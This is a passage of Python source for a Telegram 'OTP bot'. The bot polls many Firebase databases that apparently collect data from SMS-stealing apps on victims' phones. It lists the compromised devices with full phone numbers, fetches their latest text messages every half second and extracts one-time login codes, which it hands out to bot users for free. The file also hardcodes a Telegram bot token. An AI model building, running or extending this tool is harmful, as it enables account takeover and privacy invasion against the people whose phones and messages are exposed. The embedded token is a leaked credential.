#!/usr/bin/env python3
"""
Firebase SMS Dashboard Bot — FREE Edition (No Refer / No Credits / Manual Refresh)
- Multi-Firebase (40)
- BULK Firebase add
- FULL phone number display
- ✅ Force Join Channels (Admin controlled, default EMPTY)
- ❌ No Referral, No Credits, No Captcha
- ❌ No Auto-Refresh (sirf admin manual refresh)
- ⚡ Fast OTP delivery (0.5s polling)
- 📉 Render-optimized (bandwidth saving)
- Flask keep-alive server
"""

import os
import re
import json
import time
import asyncio
import logging
import gc
import random
import threading
from html import escape as html_escape
from collections import Counter
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Set

import aiohttp
from flask import Flask, jsonify
from telegram import (
    Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "7944236578:AAGn3hKWFBImaR4b_EHttnjzWKkXXL40f-0"
ADMIN_IDS = [8645142724]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger("FirebaseSMSBot")

# ============================================================
# CONSTANTS (⚡ Speed + 📉 Bandwidth Optimized)
# ============================================================
FB_REQUEST_TIMEOUT = 6
FB_RETRY_MAX = 0
FB_RETRY_BACKOFF = 1.2
FB_CLIENTS_MAX_BYTES = 50 * 1024 * 1024
FB_MESSAGES_LIMIT = 5
MAX_FIREBASES = 40
CLEANUP_INTERVAL = 60

# ⚡ Fast OTP: 0.5s polling
SMS_MONITOR_INTERVAL = 0.5
SMS_MONITOR_DURATION = 300
SMS_MONITOR_IDLE_TIMEOUT = 600

# 📉 Admin panel edit interval
ADMIN_PANEL_EDIT_INTERVAL = 5

WELCOME_IMAGE_URL = "https://i.ibb.co/cKM4HgWZ/file-000000000b5482089195baf993bd9642.png"

USER_IDS_FILE = os.getenv("USER_IDS_FILE", "bot_users.json")
MAINTENANCE_FILE = os.getenv("MAINTENANCE_FILE", "maintenance_mode.json")
GLOBAL_FB_FILE = os.getenv("GLOBAL_FB_FILE", "global_firebases.json")
GLOBAL_DEVICE_CACHE_FILE = os.getenv("GLOBAL_DEVICE_CACHE_FILE", "global_devices_cache.json")
FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")

FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
FLASK_PORT = int(os.getenv("FLASK_PORT", os.getenv("PORT", 8080)))

ACCESS_CHECK_INTERVAL = 60
JOIN_CACHE_TTL = 60

# ⚡ Global HTTP session
GLOBAL_HTTP_SESSION: Optional[aiohttp.ClientSession] = None
_user_join_cache: Dict[int, Tuple[bool, float]] = {}

FIREBASE_URL_REGEX = re.compile(
    r'https?://[A-Za-z0-9\-_.]+(?:-default-rtdb)?(?:\.firebaseio\.com|\.firebasedatabase\.app)(?:/[^\s\'"<>()\[\]{}]*)?',
    re.IGNORECASE,
)

# ============================================================
# FLASK KEEP-ALIVE
# ============================================================
flask_app = Flask(__name__)
BOT_START_TIME = time.time()


@flask_app.route("/", methods=["GET"])
def flask_root():
    try:
        uptime = int(time.time() - BOT_START_TIME)
        return jsonify({
            "status": "ok",
            "service": "Firebase SMS Bot (FREE)",
            "version": "FREE v4",
            "uptime_seconds": uptime,
            "bot_username": BOT_USERNAME,
            "firebases": len(global_fb_list),
            "users": len(known_users),
            "force_join_channels": len(REQUIRED_CHANNELS),
            "active_sms_monitors": len(sms_monitor_tasks),
            "maintenance_mode": maintenance_mode,
            "server_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }), 200
    except Exception as exc:
        logger.error("flask root error: %s", exc)
        return jsonify({"status": "error", "message": str(exc)}), 500


@flask_app.route("/health", methods=["GET"])
@flask_app.route("/healthz", methods=["GET"])
@flask_app.route("/ping", methods=["GET"])
def flask_health():
    return "OK", 200


@flask_app.route("/stats", methods=["GET"])
def flask_stats():
    try:
        return jsonify({
            "firebases": [
                {"tag": tag, "url": url, "host": fb_host_short(url)}
                for url, tag in global_fb_list
            ],
            "per_fb": global_device_cache.get("per_fb", {}),
            "online_devices": global_device_cache.get("online_count", 0),
            "offline_devices": global_device_cache.get("offline_count", 0),
            "last_refresh": global_device_cache.get("updated_at", ""),
        }), 200
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)}), 500


def _run_flask():
    try:
        logger.info("🌐 Starting Flask on %s:%s", FLASK_HOST, FLASK_PORT)
        flask_app.run(host=FLASK_HOST, port=FLASK_PORT,
                      debug=False, use_reloader=False, threaded=True)
    except Exception as exc:
        logger.error("Flask crashed: %s", exc)


def start_flask_thread():
    t = threading.Thread(target=_run_flask, name="FlaskKeepAlive", daemon=True)
    t.start()
    return t


# ============================================================
# GLOBAL HTTP SESSION
# ============================================================
async def get_http_session() -> aiohttp.ClientSession:
    global GLOBAL_HTTP_SESSION
    if GLOBAL_HTTP_SESSION is None or GLOBAL_HTTP_SESSION.closed:
        connector = aiohttp.TCPConnector(
            limit=100, limit_per_host=30,
            ttl_dns_cache=300, keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        GLOBAL_HTTP_SESSION = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=6, connect=2),
        )
    return GLOBAL_HTTP_SESSION


async def close_http_session():
    global GLOBAL_HTTP_SESSION
    if GLOBAL_HTTP_SESSION and not GLOBAL_HTTP_SESSION.closed:
        await GLOBAL_HTTP_SESSION.close()
    GLOBAL_HTTP_SESSION = None


# ============================================================
# FILE HELPERS
# ============================================================
def _load_required_channels():
    """Default channels hataye — sirf admin jo add kare wahi rahenge."""
    try:
        with open(FORCE_JOIN_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if isinstance(saved, list):
            return [item for item in saved if isinstance(item, dict) and item.get("id")]
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return []


def _save_required_channels():
    try:
        with open(FORCE_JOIN_FILE, "w", encoding="utf-8") as fh:
            json.dump(REQUIRED_CHANNELS, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save channels: %s", exc)


def _load_user_ids():
    try:
        with open(USER_IDS_FILE, "r", encoding="utf-8") as fh:
            values = json.load(fh)
        return {int(value) for value in values}
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError, ValueError):
        return set()


def _save_user_ids():
    try:
        with open(USER_IDS_FILE, "w", encoding="utf-8") as fh:
            json.dump(sorted(known_users), fh)
    except OSError as exc:
        logger.warning("could not save user ids: %s", exc)


def _load_maintenance_mode() -> bool:
    try:
        with open(MAINTENANCE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        return bool(saved.get("enabled", False)) if isinstance(saved, dict) else bool(saved)
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return False


def _save_maintenance_mode():
    try:
        with open(MAINTENANCE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"enabled": maintenance_mode}, fh)
    except OSError as exc:
        logger.warning("could not save maintenance mode: %s", exc)


def _load_global_firebases():
    try:
        with open(GLOBAL_FB_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, list):
            return []
        out = []
        for i, item in enumerate(saved):
            if isinstance(item, dict) and item.get("url"):
                u = str(item["url"]).strip().rstrip("/")
                while u.endswith(".json"):
                    u = u[:-5].rstrip("/")
                if "firebaseio.com" in u or "firebasedatabase.app" in u:
                    tag = str(item.get("tag") or f"FB{i + 1}")
                    out.append((u, tag))
        return out
    except Exception:
        return []


def _save_global_firebases():
    try:
        payload = [{"url": url, "tag": tag} for url, tag in global_fb_list]
        with open(GLOBAL_FB_FILE, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save global firebases: %s", exc)


def _retag_global_firebases():
    global global_fb_list
    global_fb_list = [(url, f"FB{i + 1}") for i, (url, _) in enumerate(global_fb_list)]


# ============================================================
# GLOBAL STATE
# ============================================================
REQUIRED_CHANNELS = _load_required_channels()
maintenance_mode = _load_maintenance_mode()
global_fb_list = _load_global_firebases()
_last_refresh_time: float = time.monotonic()

known_users = _load_user_ids()

_PHONE_PATTERNS = [
    re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'),
    re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE),
    re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9]\d{9})(?:\s|$|\.)'),
]


# ============================================================
# FIREBASE HELPERS
# ============================================================
def normalize_fb_url(url: str) -> Optional[str]:
    try:
        if not url or not isinstance(url, str):
            return None
        u = url.strip().strip('`"\'').rstrip('.,;)')
        if not u.startswith("http"):
            return None
        if "firebaseio.com" not in u and "firebasedatabase.app" not in u:
            return None
        u = u.rstrip("/")
        while u.endswith(".json"):
            u = u[:-5].rstrip("/")
        return u
    except Exception:
        return None


def extract_firebase_urls(text: str) -> List[str]:
    found: List[str] = []
    seen: Set[str] = set()
    if not text:
        return found
    for match in FIREBASE_URL_REGEX.findall(text):
        norm = normalize_fb_url(match)
        if norm and norm not in seen:
            seen.add(norm)
            found.append(norm)
    if not found:
        for token in re.split(r'[\s,;]+', text):
            norm = normalize_fb_url(token)
            if norm and norm not in seen:
                seen.add(norm)
                found.append(norm)
    return found


def _load_global_device_cache():
    try:
        with open(GLOBAL_DEVICE_CACHE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, dict) or not isinstance(saved.get("devices"), dict):
            return {"devices": {}, "online_count": 0, "offline_count": 0,
                    "per_fb": {}, "updated_at": ""}
        if "per_fb" not in saved:
            saved["per_fb"] = {}
        return saved
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return {"devices": {}, "online_count": 0, "offline_count": 0,
                "per_fb": {}, "updated_at": ""}


def _save_global_device_cache(cache):
    try:
        tmp = f"{GLOBAL_DEVICE_CACHE_FILE}.tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(cache, fh, ensure_ascii=False)
        os.replace(tmp, GLOBAL_DEVICE_CACHE_FILE)
    except OSError as exc:
        logger.warning("could not save device cache: %s", exc)


global_device_cache = _load_global_device_cache()


def fb_host_short(url: str) -> str:
    try:
        s = url.replace("https://", "").replace("http://", "")
        s = s.replace(".firebaseio.com", "").replace(".firebasedatabase.app", "")
        return s.split(".")[0][:30]
    except Exception:
        return url[:30]


def build_fb_endpoint(base_url: str, path: str = "", query: str = "") -> str:
    base = base_url.rstrip("/")
    p = (path or "").strip("/")
    q = (query or "").strip().lstrip("?")
    url = f"{base}/{p}/.json" if p else f"{base}/.json"
    if q:
        url += f"?{q}"
    return url


async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT,
                      max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
    last_err = ""
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                status = resp.status
                if status == 413:
                    return None, "TOO_LARGE", "HTTP 413"
                cl = resp.headers.get("Content-Length")
                if cl and cl.isdigit() and int(cl) > max_bytes:
                    return None, "TOO_LARGE", f"CL {cl}"
                body = b""
                async for chunk in resp.content.iter_chunked(8192):
                    body += chunk
                    if len(body) > max_bytes:
                        return None, "TOO_LARGE", "too big"
                text = body.decode("utf-8", errors="ignore").strip()
                if status in (401, 403):
                    return None, "ACCESS_DENIED", f"HTTP {status}"
                if status == 404:
                    return None, "NOT_FOUND", "HTTP 404"
                if status in (408, 504):
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                        continue
                    return None, "TIMEOUT", last_err
                if status == 429 or 500 <= status < 600:
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                        continue
                    return None, "HTTP_ERROR", last_err
                if status >= 400:
                    return None, "HTTP_ERROR", f"HTTP {status}"
                if not text or text == "null":
                    return None, "EMPTY_DATA", "null/empty"
                try:
                    data = json.loads(text)
                except json.JSONDecodeError:
                    return None, "INVALID_JSON", "json decode"
                if data is None:
                    return None, "EMPTY_DATA", "null"
                return data, "SUCCESS", ""
        except asyncio.TimeoutError:
            last_err = "timeout"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                continue
            return None, "TIMEOUT", last_err
        except aiohttp.ClientError as e:
            last_err = f"{type(e).__name__}"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                continue
            return None, "CONNECTION_ERROR", last_err
        except Exception as e:
            return None, "OTHER_ERROR", str(e)[:80]
    return None, "OTHER_ERROR", last_err or "retries exhausted"


def _get_device_name(info, cid):
    if not isinstance(info, dict):
        return cid
    for key in ("modelName", "model", "deviceName", "name"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-":
            return str(v).strip()
    return cid


def _get_mob_no(info):
    if not isinstance(info, dict):
        return ""
    raw = (info.get("mobNo") or info.get("mob_no") or info.get("mobile")
           or info.get("phoneNumber") or info.get("phone") or "")
    if not raw:
        return ""
    digits = re.sub(r"\D", "", str(raw))
    return digits


def _newest_messages(msgs, limit=FB_MESSAGES_LIMIT):
    if not isinstance(msgs, dict):
        return []
    try:
        keys = sorted(msgs.keys(), key=lambda x: int(x), reverse=True)
    except (TypeError, ValueError):
        keys = list(msgs.keys())[::-1]
    return [msgs[k] for k in keys[:limit] if isinstance(msgs.get(k), dict)]


def _newest_with_keys(msgs, limit=FB_MESSAGES_LIMIT):
    if isinstance(msgs, list):
        out = []
        for i, value in list(enumerate(msgs))[-limit:][::-1]:
            if isinstance(value, dict):
                out.append((str(i), value))
        return out
    if not isinstance(msgs, dict):
        return []

    def _sort_token(k):
        s = str(k)
        try:
            return (0, int(s), "")
        except (TypeError, ValueError):
            return (1, 0, s)

    keys = sorted(msgs.keys(), key=_sort_token, reverse=True)
    out = []
    for k in keys[:limit]:
        v = msgs.get(k)
        if isinstance(v, dict):
            out.append((str(k), v))
    return out


def _extract_msg_body(m: dict) -> str:
    if not isinstance(m, dict):
        return ""
    for key in ("body", "message", "msg", "text", "content",
                "sms", "smsBody", "messageBody", "SMS", "msgBody"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return ""


def _extract_msg_sender(m: dict) -> str:
    if not isinstance(m, dict):
        return "Unknown"
    for key in ("sender", "from", "address", "number", "phone",
                "phoneNumber", "mobile", "mobNo", "src", "originator",
                "senderNumber", "fromNumber"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return "Unknown"


def _extract_msg_time(m: dict, fallback_key: str = "") -> str:
    if isinstance(m, dict):
        for key in ("time", "timestamp", "date", "receivedTime", "received_at",
                    "sentTime", "dateTime", "createdAt"):
            v = m.get(key)
            if v is not None and str(v).strip():
                return _format_time(v)
    if fallback_key:
        return _format_time(fallback_key)
    return "Unknown"


def _extract_otp(body: str) -> Optional[str]:
    if not body:
        return None
    text = str(body).replace("\u200b", " ").replace("\u00a0", " ")
    patterns = [
        r'\b(?:OTP|code|verification|verify|login|passcode)\D{0,20}(\d{4,8})\b',
        r'\b(\d{4,8})\b(?:\D{0,20})(?:OTP|code|verification|verify|login)\b',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            try:
                candidate = match.group(1)
                if candidate and candidate.isdigit() and 4 <= len(candidate) <= 8:
                    return candidate
            except Exception:
                pass
    return None


def _otp_short_message(sender: str, body: str) -> str:
    parts = [part for part in re.split(r"[-_\s]+", str(sender)) if part]
    brand = "SMS"
    for part in parts:
        p = part.strip()
        if len(p) >= 3 and p.upper() not in ("S", "VM", "MSG", "SMS"):
            brand = p
            break
    return f"{brand.title()} login code received."


def extract_phone_from_messages(msgs) -> Optional[str]:
    try:
        if not isinstance(msgs, dict):
            return None
        counts = Counter()
        for m in _newest_messages(msgs, limit=15):
            if not isinstance(m, dict):
                continue
            text = _extract_msg_body(m)
            for pat in _PHONE_PATTERNS:
                for num in pat.findall(text):
                    d = re.sub(r'\D', '', num)
                    if len(d) == 10 and d[0] in '6789':
                        counts[d] += 1
                    elif len(d) == 12 and d.startswith('91') and d[2] in '6789':
                        counts[d[2:]] += 1
        return counts.most_common(1)[0][0] if counts else None
    except Exception:
        return None


# ============================================================
# FIREBASE FETCH
# ============================================================
async def _try_fetch_clients(session, fb_url: str):
    data, status, _ = await fb_get_json(session, build_fb_endpoint(fb_url, ""))
    if status == "SUCCESS" and isinstance(data, dict):
        clients = None
        if isinstance(data.get("clients"), dict):
            clients = data["clients"]
        elif isinstance(data.get("devices"), dict):
            clients = data["devices"]
        messages = data.get("messages") if isinstance(data.get("messages"), dict) else {}
        if isinstance(clients, dict) and clients:
            return clients, messages
    (cdata, cst, _), (ddata, dst, _) = await asyncio.gather(
        fb_get_json(session, build_fb_endpoint(fb_url, "clients"),
                    max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
        fb_get_json(session, build_fb_endpoint(fb_url, "devices"),
                    max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
    )
    if cst == "SUCCESS" and isinstance(cdata, dict) and cdata:
        return cdata, {}
    if dst == "SUCCESS" and isinstance(ddata, dict) and ddata:
        return ddata, {}
    return {}, {}


async def _fetch_phone_lookup(session, fb_url: str, cid: str):
    try:
        murl = build_fb_endpoint(fb_url, f"messages/{cid}",
                                 query='orderBy="$key"&limitToLast=15')
        fetched, status, _ = await fb_get_json(
            session, murl, max_bytes=FB_CLIENTS_MAX_BYTES,
            timeout=2, retries=0)
        if status == "SUCCESS" and isinstance(fetched, dict):
            return cid, extract_phone_from_messages(fetched)
    except Exception:
        pass
    return cid, None


async def fetch_devices_from_one(fb_url: str, fb_tag: str,
                                 only_online: bool = True,
                                 prefetched=None) -> Dict[str, dict]:
    session = await get_http_session()
    result = {}
    try:
        clients, messages_node = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients:
            return {}
        phone_lookups = {}
        lookup_ids = [
            str(cid) for cid, info in clients.items()
            if isinstance(info, dict)
            and (not only_online or info.get("status") is True)
            and not _get_mob_no(info)
            and not isinstance(messages_node.get(cid), dict)
        ][:20]
        if lookup_ids:
            lookup_results = await asyncio.gather(*[
                _fetch_phone_lookup(session, fb_url, cid) for cid in lookup_ids
            ], return_exceptions=True)
            phone_lookups = {
                cid: phone for result in lookup_results
                if isinstance(result, tuple)
                for cid, phone in [result]
                if phone
            }
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict):
                    continue
                is_online = info.get("status") is True
                if only_online and not is_online:
                    continue
                if not only_online and is_online:
                    continue
                phone = _get_mob_no(info)
                if not phone:
                    m_data = messages_node.get(cid) if isinstance(messages_node, dict) else None
                    if not isinstance(m_data, dict):
                        try:
                            ext = phone_lookups.get(str(cid))
                            if ext:
                                phone = ext
                        except Exception:
                            pass
                    if isinstance(m_data, dict) and m_data:
                        ext = extract_phone_from_messages(m_data)
                        if ext:
                            phone = ext
                if not phone:
                    continue
                prefixed_id = f"{fb_tag}|{cid}"
                result[prefixed_id] = {
                    "name": _get_device_name(info, cid),
                    "phone": phone,
                    "raw": info,
                    "online": is_online,
                    "fb_url": fb_url,
                    "fb_tag": fb_tag,
                    "real_cid": cid,
                }
            except Exception:
                continue
        return result
    except Exception as exc:
        logger.warning("fetch_devices_from_one error: %s", exc)
        return {}


async def fetch_counts_from_one(fb_url: str, fb_tag: str, prefetched=None) -> Tuple[int, int]:
    session = await get_http_session()
    online = 0
    offline = 0
    try:
        clients, _ = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients:
            return 0, 0
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict):
                    continue
                if info.get("status") is True:
                    online += 1
                else:
                    offline += 1
            except Exception:
                continue
        return online, offline
    except Exception:
        return 0, 0


async def fetch_counts_all_firebases(fb_list: List[tuple], prefetched=None) -> Tuple[int, int, Dict[str, dict]]:
    prefetched = prefetched or {}
    tasks = [fetch_counts_from_one(url, tag, prefetched=prefetched.get(url))
             for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total_online = 0
    total_offline = 0
    per_fb: Dict[str, dict] = {}
    for (url, tag), r in zip(fb_list, results):
        if isinstance(r, Exception) or not r:
            per_fb[tag] = {"online": 0, "offline": 0}
            continue
        per_fb[tag] = {"online": r[0], "offline": r[1]}
        total_online += r[0]
        total_offline += r[1]
    return total_online, total_offline, per_fb


async def fetch_devices_all_firebases(fb_list: List[tuple],
                                       only_online: bool = True,
                                       max_per_fb: int = 100,
                                       prefetched=None) -> Dict[str, dict]:
    prefetched = prefetched or {}
    tasks = [fetch_devices_from_one(url, tag, only_online,
                                     prefetched=prefetched.get(url))
             for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    merged = {}
    for r in results:
        if isinstance(r, Exception) or not r:
            continue
        for k, v in list(r.items())[:max_per_fb]:
            merged[k] = v
    return merged


async def refresh_global_device_cache():
    global global_device_cache, _last_refresh_time
    if not global_fb_list:
        global_device_cache = {
            "devices": {}, "online_count": 0, "offline_count": 0,
            "per_fb": {},
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _save_global_device_cache(global_device_cache)
        _last_refresh_time = time.monotonic()
        return global_device_cache
    try:
        devices_task = fetch_devices_all_firebases(
            global_fb_list, only_online=True, max_per_fb=150)
        counts_task = fetch_counts_all_firebases(global_fb_list)
        devices, (online_count, offline_count, per_fb) = await asyncio.gather(
            devices_task, counts_task)
        global_device_cache = {
            "devices": devices or {},
            "online_count": len(devices or {}),
            "raw_online_count": online_count,
            "offline_count": offline_count,
            "per_fb": per_fb or {},
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _save_global_device_cache(global_device_cache)
        _last_refresh_time = time.monotonic()
    except Exception as exc:
        logger.error("global device cache refresh failed: %s", exc)
    return global_device_cache


async def fetch_last_sms(fb_url: str, device_id: str, limit: int = FB_MESSAGES_LIMIT):
    session = await get_http_session()
    try:
        url = build_fb_endpoint(fb_url, f"messages/{device_id}",
                                query=f'orderBy="$key"&limitToLast={limit}')
        data, status, _ = await fb_get_json(session, url, timeout=3)
        if status == "SUCCESS" and isinstance(data, (dict, list)):
            return _newest_with_keys(data, limit=limit)
        url = build_fb_endpoint(fb_url, f"messages/{device_id}")
        data, status, _ = await fb_get_json(session, url, timeout=3)
        if status != "SUCCESS" or not isinstance(data, (dict, list)):
            return []
        return _newest_with_keys(data, limit=limit)
    except Exception:
        return []


# ============================================================
# SESSION STORE
# ============================================================
user_sessions: Dict[int, dict] = {}
sms_monitor_tasks: Dict[int, asyncio.Task] = {}
sms_monitor_state: Dict[int, dict] = {}
admin_panel_live_tasks: Dict[int, asyncio.Task] = {}
bot_instance: Optional[Bot] = None
BOT_USERNAME: str = "Otp_random_bot"


# ============================================================
# FORCE JOIN (Admin controlled, cache-based)
# ============================================================
def _is_member_status(status: str) -> bool:
    return status in {"member", "administrator", "creator"}


async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    if not REQUIRED_CHANNELS:
        return True
    cached = _user_join_cache.get(user_id)
    if cached:
        result, ts = cached
        if time.time() - ts < JOIN_CACHE_TTL:
            return result
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status):
                _user_join_cache[user_id] = (False, time.time())
                return False
        except Exception:
            _user_join_cache[user_id] = (False, time.time())
            return False
    _user_join_cache[user_id] = (True, time.time())
    return True


async def get_unjoined_channels(bot, user_id: int) -> List[dict]:
    unjoined = []
    if user_id in ADMIN_IDS:
        return unjoined
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status):
                unjoined.append(channel)
        except Exception:
            unjoined.append(channel)
    return unjoined


def build_force_join_keyboard(unjoined_channels: List[dict]) -> InlineKeyboardMarkup:
    rows: List[List[InlineKeyboardButton]] = []
    for c in unjoined_channels:
        try:
            btn = InlineKeyboardButton(
                text=f"📢 𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:28]}",
                url=c["url"],
                api_kwargs={"style": "primary"}
            )
        except TypeError:
            btn = InlineKeyboardButton(
                text=f"📢 𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:28]}", url=c["url"])
        rows.append([btn])
    try:
        check_btn = InlineKeyboardButton(
            text="✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡𝗘𝗗",
            callback_data="force_verify",
            api_kwargs={"style": "success"})
    except TypeError:
        check_btn = InlineKeyboardButton(
            text="✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡𝗘𝗗", callback_data="force_verify")
    rows.append([check_btn])
    return InlineKeyboardMarkup(rows)


def build_forcejoin_caption(first_name: str = "User") -> str:
    return (
        "🔗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗\n\n"
        f"👋 𝗛𝗶 {first_name}!\n\n"
        "📌 𝗕𝗼𝘁 𝘂𝘀𝗲 𝗸𝗮𝗿𝗻𝗲 𝘀𝗲 𝗽𝗲𝗵𝗹𝗲 𝗻𝗲𝗲𝗰𝗵𝗲 𝗱𝗶𝘆𝗲 𝗴𝗮𝘆𝗲\n"
        "𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗷𝗼𝗶𝗻 𝗸𝗮𝗿𝗼 𝗮𝘂𝗿 ✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗱𝗮𝗯𝗮𝗼.\n\n"
        "🎁 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝘁𝗮𝗹𝗹𝘆 𝗙𝗥𝗘𝗘 𝗵𝗮𝗶!"
    )


# ============================================================
# WELCOME CAPTION (No refer / No credits)
# ============================================================
def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
    safe_name = (first_name or "User").strip()
    return (
        f"🌸 𝗛𝗶𝗶 {safe_name} ⚡\n\n"
        "🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣 𝗕𝗼𝘁 ✴️\n\n"
        "🎉 𝗧𝗢𝗧𝗔𝗟𝗟𝗬 𝗙𝗥𝗘𝗘 𝗕𝗢𝗧\n"
        "🎁 𝗡𝗼 𝗥𝗲𝗳𝗲𝗿, 𝗡𝗼 𝗖𝗿𝗲𝗱𝗶𝘁𝘀\n\n"
        "👇 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁"
    )


# ============================================================
# SEND WELCOME
# ============================================================
async def send_welcome_photo(chat_id: int, first_name: str, *,
                              user_id: int = 0,
                              show_force_join: bool = False,
                              reply_markup=None, bot=None):
    if bot is None:
        bot = bot_instance
    try:
        if show_force_join:
            caption = build_forcejoin_caption(first_name)
        else:
            caption = build_welcome_caption_joined(first_name, user_id)
        if bot:
            try:
                await bot.send_photo(
                    chat_id=chat_id,
                    photo=WELCOME_IMAGE_URL,
                    caption=_bold_blockquote(caption),
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                )
                return
            except Exception as exc:
                logger.warning("send_photo failed: %s", exc)
                await bot.send_message(
                    chat_id=chat_id,
                    text=_bold_blockquote(caption),
                    parse_mode="HTML",
                    reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"[WELCOME] error: {e}")


# ============================================================
# ACCESS MIDDLEWARE (Only maintenance + force join)
# ============================================================
async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                          *, edit_target=None):
    user = update.effective_user
    uid = user.id

    if maintenance_mode and uid not in ADMIN_IDS:
        maintenance_text = _bold_blockquote(
            "🛠️ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️")
        if edit_target is not None and update.callback_query:
            try:
                cq = update.callback_query
                if getattr(cq.message, "photo", None):
                    await cq.edit_message_caption(caption=maintenance_text, parse_mode="HTML")
                else:
                    await cq.edit_message_text(maintenance_text, parse_mode="HTML")
            except Exception:
                pass
        elif update.effective_message:
            try:
                await update.effective_message.reply_text(maintenance_text, parse_mode="HTML")
            except Exception:
                pass
        return False

    if REQUIRED_CHANNELS and uid not in ADMIN_IDS:
        joined = await check_force_join(context.bot, uid)
        if not joined:
            unjoined = await get_unjoined_channels(context.bot, uid)
            kb = build_force_join_keyboard(unjoined)
            caption = build_forcejoin_caption(user.first_name or "User")
            if edit_target is not None and update.callback_query:
                try:
                    cq = update.callback_query
                    if getattr(cq.message, "photo", None):
                        await cq.edit_message_caption(
                            caption=_bold_blockquote(caption),
                            parse_mode="HTML", reply_markup=kb)
                    else:
                        await cq.edit_message_text(
                            text=_bold_blockquote(caption),
                            parse_mode="HTML", reply_markup=kb)
                    return False
                except Exception:
                    pass
            chat_id = (update.effective_chat.id if update.effective_chat
                       else update.callback_query.message.chat_id
                       if update.callback_query else None)
            if chat_id:
                await send_welcome_photo(
                    chat_id=chat_id, first_name=user.first_name or "User",
                    user_id=uid, show_force_join=True,
                    reply_markup=kb, bot=context.bot)
            return False

    return True


# ============================================================
# FORCE VERIFY CALLBACK
# ============================================================
